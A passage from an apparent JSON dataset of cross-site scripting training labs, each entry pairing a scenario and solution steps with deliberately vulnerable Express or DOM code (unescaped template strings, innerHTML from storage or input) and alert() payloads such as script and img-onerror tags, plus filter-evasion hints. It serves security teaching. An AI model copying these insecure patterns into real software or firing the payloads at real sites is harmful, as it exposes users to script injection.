      "Try multiple payload types.",
      "Confirm across devices."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.static('public')); app.get('/price.html', (req, res) => { res.send(`<html><body><div id='summary'></div><script>document.getElementById('summary').innerHTML = decodeURIComponent(location.hash.slice(1));</script></body></html>`); });",
    "payloads": [
      "#discount=<svg/onload=alert('XSS')>",
      "#<img src=x onerror=alert('X')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in employee suggestion box",
    "Lab Description": "A suggestion box stores feedback for management. The input is rendered without escaping, leading to stored XSS. To solve: Inject a malicious script into a suggestion.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit suggestion with <script>alert('HR')</script>.",
      "Login as admin and view suggestions.",
      "Observe script execution.",
      "Try payloads using event handlers.",
      "Test filter bypass techniques."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/suggest', (req, res) => { const idea = req.body.idea; db.query(\"INSERT INTO suggestions (text) VALUES (?)\", [idea]); res.redirect('/thanks'); });",
    "payloads": [
      "<script>alert('HR')</script>",
      "<svg/onload=alert('Suggestion')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in quick order summary field",
    "Lab Description": "The quick order summary feature reflects user data without escaping. If a payload is injected in the name field, it is rendered raw. To solve: Trigger reflected XSS via the name input.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit order with name=<img src=x onerror=alert('XSS')>.",
      "Observe execution on the confirmation page.",
      "Use encoded payloads to evade basic filters.",
      "Confirm reflection happens in HTML body.",
      "Check behavior in Safari and Firefox."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); app.post('/summary', (req, res) => { const name = req.body.name; res.send(`<div>Hello, ${name}</div>`); });",
    "payloads": [
      "<img src=x onerror=alert('XSS')>",
      "<script>alert('Name')</script>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online resume description",
    "Lab Description": "A resume builder app allows users to enter a description field. This is rendered without escaping, causing persistent XSS. To solve: Inject a payload in the resume description.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set description = <script>alert('Resume')</script>.",
      "Save resume and preview it.",
      "Observe XSS on resume viewer page.",
      "Try onerror payloads as alternatives.",
      "Confirm across sessions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/save-resume', (req, res) => { const desc = req.body.description; db.query(\"INSERT INTO resumes (description) VALUES (?)\", [desc]); res.redirect('/view-resume'); });",
    "payloads": [
      "<script>alert('Resume')</script>",
      "<img src=x onerror=alert('CV')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in customer support live ticket subject",
    "Lab Description": "The live support system displays ticket subjects without escaping them on the agent dashboard. Attackers can inject JavaScript into the subject to execute code when viewed. To solve: Submit a support ticket with a script in the subject.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit ticket with subject: <script>alert('SupportXSS')</script>.",
      "Login as support agent and open dashboard.",
      "Observe script execution in ticket list.",
      "Test event-based payloads like onmouseover.",
      "Confirm persistence after refresh."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-ticket', (req, res) => { const subject = req.body.subject; db.query(\"INSERT INTO tickets (subject) VALUES (?)\", [subject]); res.redirect('/ticket-confirmation'); });",
    "payloads": [
      "<script>alert('SupportXSS')</script>",
      "<img src=x onerror=alert('Ticket')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in contact form thank you message",
    "Lab Description": "The contact form reflects submitted names into a thank-you response without sanitization. This enables reflected XSS when a payload is submitted via the name field. To solve: Inject script in the name input and observe execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Fill in contact form with name=<script>alert('XSS')</script>.",
      "Submit and view confirmation page.",
      "Observe reflected script execution.",
      "Use Burp Suite to test alternate payloads.",
      "Try encoded payloads like %3Cscript%3E."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/contact', (req, res) => { const name = req.body.name; res.send(`<p>Thank you ${name}, we will contact you shortly.</p>`); });",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<svg onload=alert('Contact')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in password reset link renderer",
    "Lab Description": "The password reset tool renders user email from localStorage into the DOM using innerHTML, without escaping. To solve: Inject a payload into localStorage and reload the page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set localStorage.email = '<img src=x onerror=alert(123)>';",
      "Reload /reset.html and observe DOM update.",
      "Check preview or confirmation panel for execution.",
      "Try other event-based payloads.",
      "Validate in different browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "document.getElementById('email-display').innerHTML = localStorage.email;",
    "payloads": [
      "<img src=x onerror=alert(123)>",
      "<svg/onload=alert('Reset')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in HR system job applicant notes",
    "Lab Description": "Applicants submit notes with their job applications. These notes are stored and displayed to HR without sanitization. To solve: Inject a payload into the notes field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit application with <script>alert('Applicant')</script> in notes.",
      "Log in as HR and review submissions.",
      "Observe script execution in notes display.",
      "Test alternative payload formats.",
      "Verify execution persists after session change."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/apply', (req, res) => { const notes = req.body.notes; db.query(\"INSERT INTO applications (notes) VALUES (?)\", [notes]); res.redirect('/jobs'); });",
    "payloads": [
      "<script>alert('Applicant')</script>",
      "<img src=x onerror=alert('HR')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in e-commerce coupon validation field",
    "Lab Description": "The coupon code entry box reflects invalid codes in a response message without escaping, enabling reflected XSS. To solve: Inject a payload in the coupon parameter.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use URL: /check-coupon?code=<script>alert('XSS')</script>",
      "Observe response showing the payload.",
      "Test via Burp Suite with other payloads.",
      "Confirm execution in confirmation HTML.",
      "Try %3Cscript%3E encoded form."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/check-coupon', (req, res) => { const code = req.query.code; res.send(`<p>Coupon ${code} is not valid.</p>`); });",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('Coupon')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in virtual classroom announcement field",
    "Lab Description": "Teachers post announcements to students. These are saved and displayed without escaping, leading to stored XSS. To solve: Submit a malicious script in the announcement field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post: <script>alert('Class')</script> as announcement.",
      "Student logs in and views dashboard.",
      "Script executes in their browser.",
      "Test SVG or onerror payloads.",
      "Validate persistence across logins."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/post-announcement', (req, res) => { const msg = req.body.message; db.query(\"INSERT INTO announcements (text) VALUES (?)\", [msg]); res.redirect('/dashboard'); });",
    "payloads": [
      "<script>alert('Class')</script>",
      "<svg/onload=alert('School')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in product rating widget",
    "Lab Description": "The product rating widget loads dynamic values from sessionStorage and injects them into the DOM using innerHTML. Lack of sanitization leads to DOM-based XSS. To solve: Inject a payload into sessionStorage.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "sessionStorage.rating = '<img src=x onerror=alert(555)>';",
      "Reload product page and check rating section.",
      "Observe execution in DOM area.",
      "Test with <iframe> or encoded content.",
      "Validate it runs on other products."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "document.getElementById('rating').innerHTML = sessionStorage.rating;",
    "payloads": [
      "<img src=x onerror=alert(555)>",
      "<svg onload=alert('Rate')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in team feedback tool message board",
    "Lab Description": "The feedback board accepts anonymous messages from employees. These messages are stored and displayed to management without escaping, creating a stored XSS vector. To solve: Submit XSS payload in message field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit message: <script>alert('Feedback')</script>.",
      "Manager logs in and views message board.",
      "Script executes in browser.",
      "Test variants using onmouseover.",
      "Confirm execution after page reload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-message', (req, res) => { const msg = req.body.message; db.query(\"INSERT INTO feedback (content) VALUES (?)\", [msg]); res.redirect('/board'); });",
    "payloads": [
      "<script>alert('Feedback')</script>",
      "<img src=x onerror=alert('Board')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in newsletter signup confirmation",
    "Lab Description": "The newsletter system reflects the 'name' field back into the HTML of the confirmation page, without escaping. To solve: Inject an alert script in the name field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use /subscribe?name=<script>alert('Mail')</script>",
      "Observe execution on confirmation page.",
      "Try using %3Cscript%3E encoding.",
      "Verify if payload is reflected directly in HTML.",
      "Confirm behavior in incognito."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/subscribe', (req, res) => { const name = req.query.name; res.send(`<p>Thanks ${name} for subscribing!</p>`); });",
    "payloads": [
      "<script>alert('Mail')</script>",
      "<svg onload=alert('Newsletter')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in real estate listing title",
    "Lab Description": "Real estate agents can add property listings with titles. These are shown on public pages. Lack of output encoding results in stored XSS. To solve: Inject a payload in the listing title.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add listing with title: <script>alert('House')</script>.",
      "Visit public listings page.",
      "Observe JavaScript execution.",
      "Use Burp Suite to test with image-based payloads.",
      "Confirm visibility to unauthenticated users."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/new-listing', (req, res) => { const title = req.body.title; db.query(\"INSERT INTO listings (title) VALUES (?)\", [title]); res.redirect('/listings'); });",
    "payloads": [
      "<script>alert('House')</script>",
      "<img src=x onerror=alert('Listing')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online event registration form comment",
    "Lab Description": "The event registration form allows users to leave comments that are displayed on the event page. The input is stored without sanitization, leading to a stored XSS vulnerability. To solve: Inject a payload in the comment field and trigger execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a registration with comment: <script>alert('Event')</script>.",
      "Open the event page and check registered users' comments.",
      "Observe execution of the script in browser.",
      "Try alternate payloads for filter evasion.",
      "Ensure persistence after reload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/register', (req, res) => { const comment = req.body.comment; db.query(\"INSERT INTO registrations (comment) VALUES (?)\", [comment]); res.redirect('/event'); });",
    "payloads": [
      "<script>alert('Event')</script>",
      "<img src=x onerror=alert('XSS')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS via comment preview system",
    "Lab Description": "The application displays a live preview of comments using innerHTML from an input field. It fails to sanitize content, resulting in a DOM-based XSS. To solve: Inject a script into the comment box and observe live execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Enter: <img src=x onerror=alert('Preview')> in comment field.",
      "Check the live preview panel for execution.",
      "Use DevTools to inspect DOM behavior.",
      "Try obfuscated payloads.",
      "Confirm no escaping is applied."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "document.getElementById('preview').innerHTML = document.getElementById('input').value;",
    "payloads": [
      "<img src=x onerror=alert('Preview')>",
      "<svg onload=alert('Live')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in hotel booking special requests field",
    "Lab Description": "Guests can submit special requests during hotel booking. These requests are shown to staff without escaping, allowing persistent script execution. To solve: Inject XSS payload in the request field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Book a room with: <script>alert('Room')</script> as request.",
      "Login as hotel staff and view booking details.",
      "Observe script execution in request section.",
      "Use alternative payload formats.",
      "Test if the payload runs without login."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/book', (req, res) => { const request = req.body.request; db.query(\"INSERT INTO bookings (request) VALUES (?)\", [request]); res.redirect('/confirmation'); });",
    "payloads": [
      "<script>alert('Room')</script>",
      "<img src=x onerror=alert('Hotel')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in failed login message",
    "Lab Description": "Failed login attempts return the submitted username in an error message without encoding. This allows reflected XSS. To solve: Inject JavaScript via the username field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Enter username: <script>alert('Login')</script> and any password.",
      "Submit and observe the error message.",
      "Check DOM response for script execution.",
      "Use encoded forms for bypassing filters.",
      "Try SVG and onerror payloads."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/login', (req, res) => { const username = req.body.username; res.send(`<p>Login failed for ${username}</p>`); });",
    "payloads": [
      "<script>alert('Login')</script>",
      "<img src=x onerror=alert('LoginXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in event scheduler notes field",
    "Lab Description": "Users can schedule meetings and leave notes. These notes are rendered for all attendees without sanitization. To solve: Inject an XSS payload in the notes.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Schedule a meeting with: <script>alert('Note')</script> as notes.",
      "Join meeting as different user.",
      "Observe alert on the scheduler view.",
      "Test variations of payloads.",
      "Validate persistence in session."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/schedule', (req, res) => { const note = req.body.note; db.query(\"INSERT INTO events (note) VALUES (?)\", [note]); res.redirect('/calendar'); });",
    "payloads": [
      "<script>alert('Note')</script>",
      "<svg onload=alert('Calendar')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in article share preview link",
    "Lab Description": "The article preview page displays a shared title passed in via the URL. No escaping is performed before rendering. To solve: Inject script into the title parameter.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit /preview?title=<script>alert('Share')</script>",
      "Observe title rendered in DOM.",
      "Test encoded and tag-wrapped payloads.",
      "Use DevTools to view reflection.",
      "Ensure execution on page load."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/preview', (req, res) => { const title = req.query.title; res.send(`<h1>${title}</h1>`); });",
    "payloads": [
      "<script>alert('Share')</script>",
      "<svg onload=alert('Preview')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in survey platform question title",
    "Lab Description": "Survey creators can define question titles. These are shown to respondents without escaping, allowing persistent XSS. To solve: Inject a script in the title.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create question with title: <script>alert('Survey')</script>.",
      "Preview the survey as a respondent.",
      "Observe the script execution.",
      "Test with <img> and event-based tags.",
      "Confirm behavior across accounts."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/create-question', (req, res) => { const title = req.body.title; db.query(\"INSERT INTO questions (title) VALUES (?)\", [title]); res.redirect('/survey'); });",
    "payloads": [
      "<script>alert('Survey')</script>",
      "<img src=x onerror=alert('Poll')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in QR code label renderer",
    "Lab Description": "QR label content is fetched from `localStorage` and rendered directly with innerHTML in the QR page. No sanitization is done. To solve: Inject payload into localStorage.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set localStorage.label = '<script>alert(\"QR\")</script>';",
      "Reload the QR generator page.",
      "Check execution in label area.",
      "Try encoded event-based payloads.",
      "Confirm if DOM parsing triggers JS."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "document.getElementById('qr-label').innerHTML = localStorage.label;",
    "payloads": [
      "<script>alert('QR')</script>",
      "<svg onload=alert('Code')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in healthcare appointment notes",
    "Lab Description": "Patients can leave notes when scheduling appointments. These are shown to doctors without sanitization, enabling persistent XSS. To solve: Inject a script into notes field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Schedule appointment with note: <script>alert('Doctor')</script>.",
      "Doctor logs in and views schedule.",
      "Script executes in their browser.",
      "Test persistence after multiple views.",
      "Confirm filter evasion with <img>."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/appointment', (req, res) => { const note = req.body.note; db.query(\"INSERT INTO appointments (note) VALUES (?)\", [note]); res.redirect('/appointments'); });",
    "payloads": [
      "<script>alert('Doctor')</script>",
      "<img src=x onerror=alert('Health')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in blog author search page",
    "Lab Description": "The blog search page echoes the query back in the heading. No sanitization is applied. To solve: Inject a payload in the search parameter.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit /search-author?query=<script>alert('Blogger')</script>",
      "Observe reflection in heading.",
      "Use encoded or tag-wrapped scripts.",
      "Confirm alert on page load.",
      "Test across user agents."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/search-author', (req, res) => { const query = req.query.query; res.send(`<h3>Results for ${query}</h3>`); });",
    "payloads": [
      "<script>alert('Blogger')</script>",
      "<svg onload=alert('Author')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in freelance platform project description",
    "Lab Description": "Freelancers submit project descriptions visible to clients. The app stores and renders the description without sanitization. To solve: Inject a persistent XSS payload in the project description field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a new project with <script>alert('Freelance')</script> in the description.",
      "Login as a client and view the project listing.",
      "Observe script execution on project detail view.",
      "Try variations using different HTML tags.",
      "Ensure it triggers on every client view."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-project', (req, res) => { const desc = req.body.description; db.query(\"INSERT INTO projects (description) VALUES (?)\", [desc]); res.redirect('/projects'); });",
    "payloads": [
      "<script>alert('Freelance')</script>",
      "<img src=x onerror=alert('ProjectXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in live price quote tool",
    "Lab Description": "A live price estimator displays user input directly in the response page. There's no encoding of the value, allowing reflected XSS. To solve: Inject a script via the quote input.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Go to /quote?amount=<script>alert('Quote')</script>",
      "Observe reflection and script execution.",
      "Try other inputs like onmouseover or SVG.",
      "Confirm alert appears without login.",
      "Verify against multiple browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/quote', (req, res) => { const amount = req.query.amount; res.send(`<p>Estimated cost: ${amount}</p>`); });",
    "payloads": [
      "<script>alert('Quote')</script>",
      "<svg onload=alert('QuoteXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in internship portal resume summary",
    "Lab Description": "Interns upload resume summaries that are displayed to companies. The summary field is vulnerable to stored XSS. To solve: Submit a script as part of the resume summary.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login as intern and upload resume with <script>alert('Intern')</script> in summary.",
      "Login as company and view applicant details.",
      "Observe alert on resume view.",
      "Test different payload formats.",
      "Ensure script runs without clicking anything."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/upload-resume', (req, res) => { const summary = req.body.summary; db.query(\"INSERT INTO resumes (summary) VALUES (?)\", [summary]); res.redirect('/internships'); });",
    "payloads": [
      "<script>alert('Intern')</script>",
      "<img src=x onerror=alert('ResumeXSS')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in user greeting message",
    "Lab Description": "The dashboard uses query parameters to greet users by name. The value is inserted with innerHTML without sanitization. To solve: Inject a payload via the query string.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Visit: /dashboard.html?name=<img src=x onerror=alert('Greet')>",
      "Check the greeting section for script execution.",
      "Use DevTools to confirm unsafe insertion.",
      "Test encoded forms of script.",
      "Validate on reload and navigation."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const params = new URLSearchParams(window.location.search); document.getElementById('greeting').innerHTML = `Hello, ${params.get('name')}`;",
    "payloads": [
      "<img src=x onerror=alert('Greet')>",
      "<svg onload=alert('DOMXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in peer review portal feedback box",
    "Lab Description": "Students review each other's work and leave feedback. Feedback is displayed to others without escaping, resulting in persistent XSS. To solve: Inject JavaScript into the feedback box.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit peer feedback with <script>alert('Review')</script>.",
      "Login as another user and view the review list.",
      "Observe payload execution.",
      "Try alternate payload variants.",
      "Confirm persistence across reloads."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-review', (req, res) => { const feedback = req.body.feedback; db.query(\"INSERT INTO reviews (text) VALUES (?)\", [feedback]); res.redirect('/peer-feedback'); });",
    "payloads": [
      "<script>alert('Review')</script>",
      "<img src=x onerror=alert('FeedbackXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in language selection parameter",
    "Lab Description": "The application accepts a `lang` parameter and displays it as a label. It doesn't sanitize the value, enabling reflected XSS. To solve: Inject a script via the lang parameter.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit /select-lang?lang=<script>alert('Lang')</script>",
      "Observe label rendering in HTML.",
      "Confirm script execution on load.",
      "Try different encoding methods.",
      "Validate in various browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/select-lang', (req, res) => { const lang = req.query.lang; res.send(`<p>Language: ${lang}</p>`); });",
    "payloads": [
      "<script>alert('Lang')</script>",
      "<img src=x onerror=alert('LangXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in job posting platform cover letter",
    "Lab Description": "Applicants write cover letters that are displayed to recruiters. No escaping is applied to the letter content, allowing stored XSS. To solve: Inject script in the letter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit application with <script>alert('Cover')</script> as cover letter.",
      "Login as recruiter and view application.",
      "Observe alert on load.",
      "Try encoded variations.",
      "Test in different browser agents."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/apply-job', (req, res) => { const letter = req.body.letter; db.query(\"INSERT INTO applications (letter) VALUES (?)\", [letter]); res.redirect('/job-board'); });",
    "payloads": [
      "<script>alert('Cover')</script>",
      "<svg onload=alert('JobXSS')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in real-time analytics viewer",
    "Lab Description": "User input is appended to the live stats label via innerHTML without sanitization. This allows DOM-based XSS. To solve: Inject a malicious value and watch for execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Enter <img src=x onerror=alert('Stat')> into analytics label field.",
      "Observe DOM update via script execution.",
      "Try using encoded payloads.",
      "Test on multiple refreshes.",
      "Confirm live analytics are affected."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "document.getElementById('stats').innerHTML = document.getElementById('input').value;",
    "payloads": [
      "<img src=x onerror=alert('Stat')>",
      "<svg onload=alert('LiveXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in profile experience section",
    "Lab Description": "Users can add professional experience to their profile. The description field is stored and displayed without escaping, allowing XSS. To solve: Inject JavaScript into the experience field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Edit profile and add experience: <script>alert('Exp')</script>.",
      "Visit public profile page.",
      "Observe alert triggered on load.",
      "Try onerror, onclick and other variants.",
      "Test visibility to other users."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/add-experience', (req, res) => { const exp = req.body.exp; db.query(\"INSERT INTO experience (details) VALUES (?)\", [exp]); res.redirect('/profile'); });",
    "payloads": [
      "<script>alert('Exp')</script>",
      "<img src=x onerror=alert('ProfileXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in support contact confirmation page",
    "Lab Description": "User input from the contact form is reflected in the confirmation response. There\u00e2\u20ac\u2122s no sanitization, making it vulnerable to reflected XSS. To solve: Inject JavaScript via the name field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit contact form with name: <script>alert('Support')</script>",
      "Observe it reflected in confirmation page.",
      "Check for immediate script execution.",
      "Try multiple payload forms.",
      "Verify filter behavior."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/contact', (req, res) => { const name = req.body.name; res.send(`<p>Thank you ${name}</p>`); });",
    "payloads": [
      "<script>alert('Support')</script>",
      "<svg onload=alert('ContactXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online course description",
    "Lab Description": "The course creation page allows instructors to enter rich descriptions. The input is stored and rendered without escaping. To solve: Inject a script in the course description field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login as instructor and create a course with <script>alert('CourseXSS')</script> in description.",
      "Open course as a student.",
      "Observe script execution.",
      "Try variations in HTML context.",
      "Ensure it persists across sessions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/create-course', (req, res) => { const desc = req.body.description; db.query(\"INSERT INTO courses (description) VALUES (?)\", [desc]); res.redirect('/courses'); });",
    "payloads": [
      "<script>alert('CourseXSS')</script>",
      "<img src=x onerror=alert('Course')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in calendar event preview",
    "Lab Description": "A calendar tool shows event previews from query parameters. The input is not encoded, allowing reflected XSS. To solve: Inject a script in the title parameter.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Access /event-preview?title=<script>alert('Event')</script>",
      "Check if script is executed.",
      "Inspect HTML source for injection point.",
      "Try encoded payloads.",
      "Ensure it works without login."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/event-preview', (req, res) => { const title = req.query.title; res.send(`<h3>Event: ${title}</h3>`); });",
    "payloads": [
      "<script>alert('Event')</script>",
      "<svg onload=alert('Calendar')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in travel portal trip notes",
    "Lab Description": "Travelers can add personal notes for trips. These notes are rendered on trip pages without sanitization. To solve: Inject a persistent script in the notes field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a trip and add note: <script>alert('Trip')</script>.",
      "Access trip details from another account.",
      "Observe script execution.",
      "Try onerror and SVG payloads.",
      "Verify persistence in DB."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/add-note', (req, res) => { const note = req.body.note; db.query(\"INSERT INTO notes (text) VALUES (?)\", [note]); res.redirect('/trips'); });",
    "payloads": [
      "<script>alert('Trip')</script>",
      "<img src=x onerror=alert('NoteXSS')>"
    ]
  },
  {
    "Lab scenario": "DOM XSS in online invoice viewer footer",
    "Lab Description": "The invoice viewer reads a footer note from localStorage and injects it via innerHTML. To solve: Add a malicious footer value in localStorage.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Run: localStorage.setItem('footer','<img src=x onerror=alert(\"Invoice\")>')",
      "Reload invoice view page.",
      "Watch footer for script execution.",
      "Try encoded payloads.",
      "Verify effect across sessions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "document.getElementById('footer').innerHTML = localStorage.getItem('footer');",
    "payloads": [
      "<img src=x onerror=alert(\"Invoice\")>",
      "<svg onload=alert('InvoiceXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in book review system",
    "Lab Description": "Users submit reviews on books, which are rendered to the public. The content is displayed without escaping, enabling stored XSS. To solve: Inject a payload into the review form.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a book review with <script>alert('Book')</script>.",
      "Visit the book\u00e2\u20ac\u2122s page.",
      "Observe XSS execution.",
      "Use Burp to confirm DB storage.",
      "Ensure it triggers for all viewers."
    ],
    "Vulnerability name": "Cross-site scripting",
